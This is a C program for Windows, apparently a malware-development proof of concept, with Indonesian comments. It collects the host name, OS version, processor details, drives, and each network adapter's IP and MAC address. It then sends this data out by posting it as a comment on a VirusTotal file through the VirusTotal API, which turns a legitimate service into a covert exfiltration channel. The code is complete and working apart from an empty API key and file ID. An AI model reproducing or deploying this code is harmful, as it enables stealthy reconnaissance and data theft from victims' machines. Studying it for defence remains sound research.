#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>
#include <iphlpapi.h>

#define VT_API_KEY L""
#define FILE_ID L""

// Fungsi untuk mengonversi char* ke wchar_t*
wchar_t* ConvertToWideChar(const char* source) {
    size_t length = strlen(source) + 1;
    wchar_t* wideString = (wchar_t*)malloc(length * sizeof(wchar_t));
    mbstowcs(wideString, source, length);
    return wideString;
}

int sendToVT(const char* comment) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        fprintf(stderr, "WinHttpOpen failed. Error: %d\n", GetLastError());
        return 1;
    }

    hConnect = WinHttpConnect(hSession, L"www.virustotal.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        fprintf(stderr, "WinHttpConnect failed. Error: %d\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return 1;
    }

    hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v3/files/" FILE_ID L"/comments", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        fprintf(stderr, "WinHttpOpenRequest failed. Error: %d\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    // Konversi body ke wchar_t*
    char json_body[4096];
    snprintf(json_body, sizeof(json_body), "{\"data\": {\"type\": \"comment\", \"attributes\": {\"text\": \"%s\"}}}", comment);
    wchar_t* w_json_body = ConvertToWideChar(json_body);

    // Header yang benar
    LPCWSTR headers = L"x-apikey: " VT_API_KEY L"\r\nContent-Type: application/json";

    // Kirim request
    if (!WinHttpSendRequest(hRequest, headers, -1, (LPVOID)w_json_body, wcslen(w_json_body) * sizeof(wchar_t), wcslen(w_json_body) * sizeof(wchar_t), 0)) {
        fprintf(stderr, "WinHttpSendRequest failed. Error: %d\n", GetLastError());
        free(w_json_body);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    free(w_json_body);

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        fprintf(stderr, "WinHttpReceiveResponse failed. Error: %d\n", GetLastError());
    }

    DWORD statusCode = 0, size = sizeof(statusCode);
    if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &size, WINHTTP_NO_HEADER_INDEX)) {
        if (statusCode == 200) {
            printf("Comment posted successfully.\n");
        } else {
            printf("Failed to post comment. HTTP Status Code: %d\n", statusCode);
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 0;
}

int main(int argc, char* argv[]) {
    char systemInfo[4096];

    // Get host name
    CHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(hostName);
    GetComputerNameA(hostName, &size);

    // Get OS version
    OSVERSIONINFO osVersion;
    osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&osVersion);

    // Get system information
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    // Get logical drive information
    DWORD drives = GetLogicalDrives();

    // Get IP address
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD adapterInfoSize = sizeof(adapterInfo);
    if (GetAdaptersInfo(adapterInfo, &adapterInfoSize) != ERROR_SUCCESS) {
        printf("GetAdaptersInfo failed. Error: %d\n", GetLastError());
        return 1;
    }

    snprintf(systemInfo, sizeof(systemInfo),
        "Host Name: %s, "
        "OS Version: %d.%d.%d, "
        "Processor Architecture: %d, "
        "Number of Processors: %d, "
        "Logical Drives: %X, ",
        hostName,
        osVersion.dwMajorVersion, osVersion.dwMinorVersion, osVersion.dwBuildNumber,
        sysInfo.wProcessorArchitecture,
        sysInfo.dwNumberOfProcessors,
        drives);

    // Add IP address information
    for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter != NULL; adapter = adapter->Next) {
        snprintf(systemInfo + strlen(systemInfo), sizeof(systemInfo) - strlen(systemInfo),
            "Adapter Name: %s, "
            "IP Address: %s, "
            "Subnet Mask: %s, "
            "MAC Address: %02X-%02X-%02X-%02X-%02X-%02X",
            adapter->AdapterName,
            adapter->IpAddressList.IpAddress.String,
            adapter->IpAddressList.IpMask.String,
            adapter->Address[0], adapter->Address[1], adapter->Address[2],
            adapter->Address[3], adapter->Address[4], adapter->Address[5]);
    }

    int result = sendToVT(systemInfo);

    if (result == 0) {
        printf("ok =^..^=\n");
    } else {
        printf("nok <3()~\n");
    }

    return 0;
}
